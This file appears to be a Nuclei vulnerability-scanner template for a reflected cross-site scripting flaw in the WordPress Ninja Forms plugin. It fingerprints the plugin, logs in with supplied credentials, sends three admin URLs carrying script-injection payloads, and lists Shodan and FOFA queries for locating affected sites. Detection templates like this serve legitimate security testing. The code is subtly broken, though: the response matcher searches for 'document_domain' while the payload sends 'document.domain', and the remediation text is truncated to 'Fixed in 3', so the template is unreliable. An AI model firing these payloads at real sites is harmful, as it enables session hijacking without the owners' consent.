id: ninja-forms-xss

info:
  name: Ninja Forms < 3.5.5 - 跨站脚本漏洞
  author: ritikchaddha
  severity: medium
  description: Ninja Forms < 3.5.5 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  impact: |
    - 攻击者可在受害者浏览器上下文中执行恶意脚本。
    - 可能导致 Cookie 窃取、会话劫持、页面篡改或钓鱼攻击。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Fixed in 3。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://wpscan.com/vulnerability/ba6fa3d6-e3f7-449a-bd78-d57c26a67aa6/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-80
    cpe: cpe:2.3:a:ninjaforms:ninja_forms:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 5
    vendor: ninjaforms
    product: ninja_forms
    framework: wordpress
    fofa-query: body="/wp-content/plugins/ninja-forms"
    publicwww-query: /wp-content/plugins/ninja-forms/
    shodan-query: http.html:"/wp-content/plugins/ninja-forms/"
  tags: cve2021,wp,wordpress,wp-plugin,ninja-forms,xss,authenticated,vuln

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body_1
        words:
          - "/wp-content/plugins/ninja-forms"
        internal: true

  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

    matchers:
      - type: status
        status:
          - 302
        internal: true

  - raw:
      - |
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}

    payloads:
      path:
        - wp-admin/admin.php?page=nf-settings&"><script>alert(/document.domain/)</script>
        - wp-admin/admin.php?page=nf-import-export&"><script>alert(/document.domain/)</script>
        - wp-admin/edit.php?post_status=all&post_type=nf_sub&form_id=1&"><script>alert(/document.domain/)</script>

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"><script>alert(/document_domain/)</script>'

      - type: word
        part: content_type
        words:
          - text/html

      - type: status
        status:
          - 200
